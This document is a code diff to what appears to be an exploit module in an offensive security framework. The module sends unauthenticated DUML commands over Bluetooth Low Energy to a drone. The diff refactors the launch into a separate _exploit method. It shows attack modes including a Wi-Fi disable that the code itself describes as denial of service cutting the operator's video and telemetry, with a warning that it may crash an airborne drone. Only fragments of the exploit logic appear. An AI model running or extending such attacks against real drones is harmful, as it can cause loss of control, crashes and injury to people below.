@@ -264,6 +264,11 @@ class Exploit(Exploit):
         if not self._validate():
             return
 
+        print_success("Validation passed, launching exploit...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: send unauthenticated DUML commands over BLE."""
         mode = str(self.mode).strip().lower()
         simulate = bool(self.simulate)
         addr = str(self.target).strip()
@@ -318,8 +323,8 @@ class Exploit(Exploit):
             desc = "Restart Wi-Fi interface (brief disconnection)"
         elif mode == "wifi_disable":
             frame = _build_wifi_disable()
-            desc = "Disable Wi-Fi interface (DoS -- operator loses video+telemetry)"
-            print_warning("DO NOT use wifi_disable on an airborne drone -- may cause crash")
+            desc = "Disable Wi-Fi interface (DoS: operator loses video+telemetry)"
+            print_warning("DO NOT use wifi_disable on an airborne drone: may cause crash")
         else:
             print_error(f"Unknown mode: {mode}")
             return
